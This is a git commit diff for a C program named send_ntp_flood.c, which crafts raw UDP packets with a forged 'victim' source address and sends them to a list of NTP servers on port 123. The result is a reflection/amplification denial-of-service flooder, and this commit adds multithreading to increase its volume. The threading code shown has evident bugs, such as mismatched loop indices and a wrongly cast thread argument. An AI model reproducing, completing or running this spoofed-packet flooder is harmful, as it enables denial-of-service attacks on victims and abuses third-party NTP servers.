eb9043f4107af0a5079c5d4680be648e5b74afc6
wuming <itiswm@163.com>
2019-12-20 11:25:43 +0800

    开始调整线程参数

--- c语言/send_ntp_flood.c
+++ c语言/send_ntp_flood.c
@@ -10,6 +10,7 @@
 #include <stdlib.h> //for exit(0);
 #include <string.h> //memset,memcpy
 #include <time.h>
+#include <pthread.h>
 
 //needed for checksum calculation
 struct pseudo_header {
@@ -92,69 +93,75 @@ void send_ntp(in_addr_t *ip_list, int size) {
     // 将 ip 首部指针和 udp 首部指针指向各自的位置，
     struct iphdr *ip_header = (struct iphdr *) datagram;
     struct udphdr *udp_header = (struct udphdr *) (datagram + iphdr_size);
-    //data赋值在udp header后面
-    if (payload_data != NULL) {
-        strcpy(datagram + iphdr_size + udphdr_size, payload_data);
-    }
-
-    // 填充 ip 首部字段
-    ip_header->ihl = 5;                     //普通 IP 数据报
-    ip_header->version = 4;                 //IPv4
-    ip_header->tos = 0;
-    ip_header->tot_len = htons(datagram_size);
-    ip_header->id = 0;                      //自定 IP 包标识，方便筛选
-    ip_header->frag_off = 0;
-    ip_header->ttl = 255;
-    ip_header->protocol = IPPROTO_UDP;                      //指定承载的是 UDP 数据包
-    ip_header->check = 0;                                //之后需要计算校验和
-    ip_header->saddr = victim_inet_addr;
-//    ip_header->daddr = dst_inet_addr;
-
-    //计算 ip 校验和，结果为两个字节
-//    ip_header->check = calculate_checkcsum((unsigned short *) datagram, datagram_size);
-
-    // 填充 udp 首部字段
-//    udp_header->source = htons(src_port);   //htons means host to network short
-    udp_header->dest = htons(123);     //if spec value < 255(8bit) , there is no need to use htons
-    udp_header->len = htons(udphdr_size + payload_size);
-    udp_header->check = 0;                  //之后需要计算校验和
-
 
     //借助伪头部计算 udp 校验和
     //伪头部的大小：伪首部（8个字节）+udp首部（20个字节）+数据
     const int psize = pseudohdr_size + udphdr_size + payload_size;
     char *pseudogram = malloc(psize);
     bzero(pseudogram, sizeof(pseudogram));
-
     struct pseudo_header *psh = (struct pseudo_header *) pseudogram;
-    psh->source_address = victim_inet_addr;
-//    psh->dest_address = dst_inet_addr;
-    psh->placeholder = 0;
-    psh->protocol = IPPROTO_UDP;
-    psh->udp_or_tcp_length = htons(udphdr_size + payload_size);
 
-//    memcpy(pseudogram + pseudohdr_size, udp_header, udphdr_size + payload_size);
-
-    //计算 udp 校验和
-//    udp_header->check = calculate_checkcsum((unsigned short *) pseudogram, psize);
-
-    //↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑至此，数据包构造完毕↑↑↑↑↑↑↑↑↑↑↑↑
-
-    for (;;) {
+    int j = 0;
+    for (j = 0; j < 5; j++) {
         dest.sin_addr.s_addr = ip_list[cur_index];
 
+//        char datagram[datagram_size];
+        bzero(datagram, sizeof(datagram));
+
+        // 将 ip 首部指针和 udp 首部指针指向各自的位置，
+//        struct iphdr *ip_header = (struct iphdr *) datagram;
+//        struct udphdr *udp_header = (struct udphdr *) (datagram + iphdr_size);
+        //data赋值在udp header后面
+        if (payload_data != NULL) {
+            strcpy(datagram + iphdr_size + udphdr_size, payload_data);
+        }
+
+        // 填充 ip 首部字段
+        ip_header->ihl = 5;                     //普通 IP 数据报
+        ip_header->version = 4;                 //IPv4
+        ip_header->tos = 0;
+        ip_header->tot_len = htons(datagram_size);
+        ip_header->id = 0;                      //自定 IP 包标识，方便筛选
+        ip_header->frag_off = 0;
+        ip_header->ttl = 255;
+        ip_header->protocol = IPPROTO_UDP;                      //指定承载的是 UDP 数据包
+        ip_header->check = 0;                                //之后需要计算校验和
+        ip_header->saddr = victim_inet_addr;
         ip_header->daddr = ip_list[cur_index];
 
+        //计算 ip 校验和，结果为两个字节
+        ip_header->check = calculate_checkcsum((unsigned short *) datagram, datagram_size);
+
+        // 填充 udp 首部字段
         if (is_random_victim_port > 0) {
             victim_port = (unsigned short) (abs((int) random()) % 40000 + 20000);
         }
-        udp_header->source = htons(victim_port);
+        udp_header->source = htons(victim_port);   //htons means host to network short
+        udp_header->dest = htons(123);     //if spec value < 255(8bit) , there is no need to use htons
+        udp_header->len = htons(udphdr_size + payload_size);
+        udp_header->check = 0;                  //之后需要计算校验和
 
+
+        //借助伪头部计算 udp 校验和
+        //伪头部的大小：伪首部（8个字节）+udp首部（20个字节）+数据
+//        const int psize = pseudohdr_size + udphdr_size + payload_size;
+//        char *pseudogram = malloc(psize);
+        bzero(pseudogram, sizeof(pseudogram));
+
+//        struct pseudo_header *psh = (struct pseudo_header *) pseudogram;
+        psh->source_address = victim_inet_addr;
         psh->dest_address = ip_list[cur_index];
+        psh->placeholder = 0;
+        psh->protocol = IPPROTO_UDP;
+        psh->udp_or_tcp_length = htons(udphdr_size + payload_size);
+
         memcpy(pseudogram + pseudohdr_size, udp_header, udphdr_size + payload_size);
 
-        ip_header->check = calculate_checkcsum((unsigned short *) datagram, datagram_size);
+        //计算 udp 校验和
         udp_header->check = calculate_checkcsum((unsigned short *) pseudogram, psize);
+
+        //↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑至此，数据包构造完毕↑↑↑↑↑↑↑↑↑↑↑↑
+
 
         ssize_t bytes_sent = sendto(
                 send_socket, datagram, datagram_size,
@@ -162,7 +169,7 @@ void send_ntp(in_addr_t *ip_list, int size) {
         );
 
         if (bytes_sent < 0) {
-            fprintf(stderr, "ERROR: Send datagram fail\n");
+            perror("Send datagram fail");
         }
 
         cur_index++;
@@ -251,8 +258,19 @@ int main(int argc, char *argv[]) {
     }
     fclose(fp);
 
-    send_ntp(ip_list, line_count);
 
+    //start multi thread
+    pthread_t tids[thread_count];
+    int k;
+    for (k = 0; k < thread_count; k++) {
+        //第一个参数tid，第二个参数线程param，一般传NULL，第三个参数，方法指针，第四个参数，方法的参数列表，如果没有参数就传NULL
+        pthread_create(&tids[j], NULL, (void *) send_ntp, (void *) line_count);
+    }
+    for (j = 0; j < thread_count; j++) {
+        pthread_join(tids[j], NULL);
+    }
+
+    send_ntp(ip_list, line_count);
     // sockfd should close here !
     return 0;
 }
